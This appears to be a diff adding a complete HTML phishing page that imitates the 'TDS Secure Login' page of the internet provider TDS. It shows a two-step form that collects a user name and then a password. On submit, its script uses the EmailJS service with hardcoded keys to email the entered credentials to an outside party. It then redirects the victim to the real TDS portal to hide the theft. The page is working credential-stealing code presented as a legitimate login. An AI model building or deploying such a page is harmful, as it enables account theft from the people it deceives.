@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Two-Step Login Form</title>
+  <style>
+    html, body {
+      background-color: #ffffff;
+      margin: 0;
+      height: 100%;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      padding: 2rem 1rem;
+    }
+
+    .logo-container {
+      text-align: center;
+      margin-bottom: 0.6rem;
+    }
+
+    .logo-container img {
+      max-width: 120px;
+      height: auto;
+    }
+
+    hr.separator {
+      width: 100%;
+      border: none;
+      border-top: 2px solid #ccc;
+      margin-bottom: 1.7rem;
+    }
+
+    .login-title {
+      color: #19388A;
+      font-size: 2rem;
+      font-weight: 450;
+      margin-bottom: 2rem;
+      text-align: center;
+      letter-spacing: -0.02em;
+    }
+
+    .login-container {
+      background: #fff;
+      padding: 1.5rem;
+      border-radius: 2px;
+      box-shadow: 0 0px 0px rgba(0, 0, 0, 0.12);
+      width: 100%;
+      max-width: 400px;
+      box-sizing: border-box;
+    }
+
+    .form-step {
+      display: none;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+    .user-image-block {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+
+    .user-image {
+      max-width: 72px;
+      max-height: 72px;
+      margin-bottom: 0.7rem;
+      display: block;
+    }
+
+    .username-display {
+      font-weight: bold;
+      font-size: 1.1rem;
+      color: #333;
+      text-align: center;
+    }
+
+    .input-group {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.3rem;
+      font-weight: 600;
+      font-size: 1rem;
+      color: #222;
+    }
+
+    .input-description {
+      color: #6a6a6a;
+      margin-bottom: 0.4rem;
+      font-size: 0.8rem;
+      font-style: italic;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    button {
+      width: 100%;
+      padding: 0.75rem;
+      font-size: 1rem;
+      border: 2px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      margin-bottom: 0.5rem;
+    }
+
+    button {
+      background-color: #19388A;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    button:hover {
+      background-color: #337ab7;
+    }
+
+    .well {
+      font-size: 0.95rem;
+      line-height: 1.5;
+      color: #555;
+      padding: 1rem;
+      background-color: #f5f5f5;
+      border: 1px solid #e3e3e3;
+      border-radius: 4px;
+      margin: 1.5rem 0;
+    }
+
+    a.btn.btn-default {
+      -webkit-text-size-adjust: 100%;
+      -webkit-tap-highlight-color: rgba(0,0,0,0);
+      box-sizing: border-box;
+      display: inline-block;
+      font-weight: 400;
+      line-height: 1.42857143;
+      white-space: nowrap;
+      vertical-align: middle;
+      touch-action: manipulation;
+      cursor: pointer;
+      user-select: none;
+      background-image: none;
+      border: 1px solid transparent;
+      transition: all 0.2s ease-in-out;
+      font-size: 16px;
+      text-decoration: none;
+      margin: 24px 0;
+      padding: 12px 16px;
+      border-color: transparent;
+      font-family: 'ITC Avant Garde Gothic W01', 'Century Gothic', 'Arial';
+      color: #FFF;
+      text-align: center;
+      border-radius: 0;
+      box-shadow: 1px 1px 3px 0 rgba(0, 0, 0, 0.5);
+      background-color: #0C8FD0;
+      width: 100%;
+      max-width: 400px;
+      box-sizing: border-box;
+    }
+
+    /* Responsive adjustments */
+    @media screen and (max-width: 768px) {
+      .login-title {
+        font-size: 1.8rem;
+      }
+
+      .login-container {
+        padding: 1rem;
+        max-width: 100%;
+      }
+
+      a.btn.btn-default {
+        max-width: 100%;
+      }
+    }
+
+    @media screen and (max-width: 480px) {
+      body {
+        padding: 1rem;
+      }
+
+      .login-title {
+        font-size: 1.5rem;
+      }
+
+      .logo-container img {
+        max-width: 100px;
+      }
+
+      a.btn.btn-default {
+        font-size: 14px;
+        padding: 10px 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-container">
+    <img src="https://i.imghippo.com/files/ynAl1447yNo.png" alt="Logo" />
+  </div>
+  <hr class="separator" />
+  <div class="login-title">TDS Secure Login</div>
+
+  <div class="login-container">
+    <form id="loginForm" autocomplete="off">
+      <!-- Step 1: Username -->
+      <div class="form-step active" id="step1">
+        <div class="user-image-block">
+          <img class="user-image" src="https://i.imghippo.com/files/OdKX9131hAs.png" alt="User Icon" />
+        </div>
+        <div class="input-group">
+          <label for="username">User Name or Email Address</label>
+          <input type="text" id="username" name="user_email" required autofocus />
+          <div class="input-description">
+            Examples: <a>username@tds.net</a> or <a>username@gmail.com</a>
+          </div>
+        </div>
+
+        <div class="well">
+          <p><strong>Please note:</strong> a TDS-provided user name ends with @tds.net, @merr.com, or @chorus.net.</p>
+        </div>
+
+        <button type="button" id="nextBtn">Next</button>
+      </div>
+      <!-- Step 2: Password -->
+      <div class="form-step" id="step2">
+        <div class="user-image-block">
+          <img class="user-image" src="https://i.imghippo.com/files/OdKX9131hAs.png" alt="User Icon" />
+          <div class="username-display" id="showUsername"></div>
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="user_password" required />
+          <div class="input-description">Enter your password to sign in.</div>
+        </div>
+
+        <div class="well">
+          <p><strong>Please note:</strong> a TDS-provided user name ends with @tds.net, @merr.com, or @chorus.net.</p>
+        </div>
+
+        <button type="submit" id="loginBtn">Login</button>
+      </div>
+    </form>
+  </div>
+
+  <a class="btn btn-default" onclick="javascript:history.back()">Return to Previous Page</a>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("SdkmRe8WZ7itEba9z"); // your public key
+
+    const step1 = document.getElementById("step1");
+    const step2 = document.getElementById("step2");
+    const nextBtn = document.getElementById("nextBtn");
+    const usernameInput = document.getElementById("username");
+    const showUsername = document.getElementById("showUsername");
+    const loginForm = document.getElementById("loginForm");
+
+    nextBtn.onclick = function () {
+      if (usernameInput.value.trim() !== "") {
+        showUsername.textContent = usernameInput.value.trim();
+        step1.classList.remove("active");
+        step2.classList.add("active");
+        document.getElementById("password").focus();
+      } else {
+        usernameInput.focus();
+      }
+    };
+
+    loginForm.onsubmit = function (e) {
+      e.preventDefault();
+      emailjs.sendForm("service_zuj2d2a", "template_tvd86sp", "#loginForm")
+        .then(function(response) {
+          console.log("SUCCESS!", response.status, response.text);
+          window.location.href = "https://portal.tds.net"; // redirect URL
+        }, function(error) {
+          console.error("FAILED...", error);
+          alert("Failed to send. Please try again.");
+        });
+    };
+  </script>
+</body>
+</html>
